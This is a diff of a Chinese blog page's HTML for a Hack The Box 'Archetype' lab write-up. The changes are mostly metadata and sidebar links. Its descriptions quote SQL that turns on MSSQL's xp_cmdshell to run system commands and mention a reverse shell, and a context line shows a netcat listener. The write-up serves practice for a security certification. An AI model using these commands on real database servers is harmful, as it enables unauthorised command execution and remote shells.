@@ -51,9 +51,10 @@ smbclient(选项)(参数)
 2、mssql开启xp_cmdshell
 EXEC sp_configure &#39;Show Advanced Options&#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &#39;xp_cmdshell&#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &#34;whoami&#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://getshe11.com/post/archetype/" />
-<meta property="article:published_time" content="2020-12-06T15:30:00+00:00" />
-<meta property="article:modified_time" content="2020-12-06T15:30:00+00:00" />
+<meta property="og:url" content="https://getshe11.com/post/archetype/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2020-12-06T15:30:00&#43;00:00" />
+<meta property="article:modified_time" content="2020-12-06T15:30:00&#43;00:00" />
+
 <meta itemprop="name" content="Hackthebox-Archetype">
 <meta itemprop="description" content="0x01 前言 挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。
 这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。
@@ -68,15 +69,10 @@ EXEC sp_configure &#39;Show Advanced Options&#39;, 1;	\\使用sp_configure系统
 smbclient(选项)(参数)
 -B&lt;ip地址&gt;：传送广播数据包时所用的IP地址； -d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度； -E：将信息送到标准错误输出设备； -h：显示帮助； -i&lt;范围&gt;：设置NetBIOS名称范围； -I&lt;IP地址&gt;：指定服务器的IP地址； -l&lt;记录文件&gt;：指定记录文件的名称； -L：显示服务器端所分享出来的所有资源； -M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机； -n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称； -N：不用询问密码； -O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项； -p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号； -R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序； -s&lt;目录&gt;：指定smb.conf所在的目录； -t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称； -T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件； -U&lt;用户名称&gt;：指定用户名称； -w&lt;工作群组&gt;：指定工作群组名称。 连接服务器smbclient //192.168.0.1/tmp -U username%password
 2、mssql开启xp_cmdshell
-EXEC sp_configure &#39;Show Advanced Options&#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &#39;xp_cmdshell&#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &#34;whoami&#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell">
-<meta itemprop="datePublished" content="2020-12-06T15:30:00+00:00" />
-<meta itemprop="dateModified" content="2020-12-06T15:30:00+00:00" />
+EXEC sp_configure &#39;Show Advanced Options&#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &#39;xp_cmdshell&#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &#34;whoami&#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell"><meta itemprop="datePublished" content="2020-12-06T15:30:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-12-06T15:30:00&#43;00:00" />
 <meta itemprop="wordCount" content="127">
-
-
-
-<meta itemprop="keywords" content="hackthebox," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="hackthebox," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Hackthebox-Archetype"/>
 <meta name="twitter:description" content="0x01 前言 挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。
 这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。
@@ -259,6 +255,10 @@ nc -nvvlp 443 //监听
     <ul class="post-list">
         
         <li>
+            <a href="https://getshe11.com/post/research-on-php-deserialization/" class="post-link">PHP反序列化研究</a>
+        </li>
+        
+        <li>
             <a href="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/" class="post-link">Gitlab Cookie 反序列化漏洞研究</a>
         </li>
         
@@ -312,10 +312,6 @@ nc -nvvlp 443 //监听
         
         <li>
             <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
-        </li>
-        
-        <li>
-            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
         </li>
         
     </ul>
